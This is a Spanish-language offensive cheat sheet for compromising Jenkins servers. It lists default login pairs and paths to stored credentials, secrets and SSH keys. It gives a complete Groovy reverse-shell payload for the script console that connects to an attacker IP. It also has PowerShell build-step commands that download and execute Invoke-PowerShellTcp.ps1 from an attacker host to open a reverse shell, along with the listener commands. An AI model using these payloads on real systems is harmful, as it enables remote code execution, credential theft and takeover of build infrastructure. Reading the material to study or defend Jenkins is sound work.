# Jenkins 

Tags: #AD #Linux #Windows #Jenkins #Groovy  

## Abusar de la app 'Jenkins' 

```bash 
Si hay una versión antigua es probable que sea una aplicación vulnerable. El servidor Jenkins es ejecutado en el puerto '8080' 

Aparte de numerosos plugins, hay dos maneras de ejecutar comandos en un 'Jenkins Master'
```

```bash 
# Usuarios 
admin:admin
jenkins:jsnkins 
root:root
builduser
manager
jenkinsadmin
```

## Rutas dentro del server Linux
```bash 
/var/lib/jenkins/config.xml
# Configuración global de Jenkins.

/var/lib/jenkins/credentials.xml
# Credenciales almacenadas y referencias a credenciales.

/var/lib/jenkins/secrets/
# Claves y secretos internos utilizados por Jenkins.

/var/lib/jenkins/.ssh/
# Claves y configuración SSH del usuario Jenkins.

/var/lib/jenkins/users/
# Configuración y datos de los usuarios de Jenkins.

/var/lib/jenkins/jobs/
# Directorio donde se almacenan los Jobs/Pipelines.

/var/lib/jenkins/jobs/*/config.xml
# Configuración individual de cada Job; puede contener repositorios,
# variables, credenciales asociadas y comandos.

/var/lib/jenkins/workspace/
# Archivos generados o descargados durante la ejecución de Jobs.

/var/lib/jenkins/nodes/
# Configuración de agentes/nodos de Jenkins.

/var/lib/jenkins/plugins/
# Plugins instalados y sus archivos/configuraciones.

/var/lib/jenkins/logs/
# Logs de Jenkins que pueden revelar información útil.

/var/lib/jenkins/war/
# Archivos de la aplicación Jenkins desplegada.
```

## Forma 1 - Jenkins Master (Groovy)

**Groovy** es un **lenguaje de programación** que corre sobre la **JVM (Java Virtual Machine)**. Está muy relacionado con Java, pero tiene una sintaxis más flexible y concisa.

```powershell 
Si se tiene acceso 'Admin' la cual viene instalada en las versiones <2.x

	http://<jenkins_server>:8080/script 

# En la consola, es posible obtener RCE mediante la ejecución de scripts en Groovy:

String host="IP_Kali";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Forma 2 - Jenkins Master

```powershell 
1. Se debe tener credenciales validas para acceder al 'login'
Si no se tiene permisos de 'Admin' pero se puede agregar o editar 'build steps' en la pestaña 'Source Code Management' de la configuración.

2. Mirar si se esta en un 'Jenkins Master' mirando la parte de 'Buil Executor Status' donde si aparece 'Built-In Node' significa que si lo es 

3. Ir a algún proyecto en verde, luego a 'Configure > Add build step > Execute Windows batch command'. Se puede descargar, ejecutar scripts, correr scripts encodeados y más 


4. Descargar, guardar el script para crear una Revershell en Jenkins.
❯ powershell iex (iwr -UseBasicParsing http://IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress IP_Atacante -Port 4444    
❯ powershell.exe iex (iwr http://IP/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress IP_Atacante -Port 4444

❯ nc64.exe -nlvp 4444     # Recibir la ReverShell en la máquina de atacante Windows 
	❯ $env:username       # Mirar el usuario actual en powershell 
	❯ $env:computername   # Mirar el nombre del computador (server)
	❯ ls env:             # Mirar los detalles del server 


Notas:
	1. Para compartir el script de 'Invoke-PowerShelTcp.ps1' se puede ejecutar en la máquina de atacante Windows el programa de 'hfs.exe' que permite compartir archivos 
	2. Dar click en 'Build now' cuando ya se tenga el comando de escucha y el script compartido con 'hfs'
```
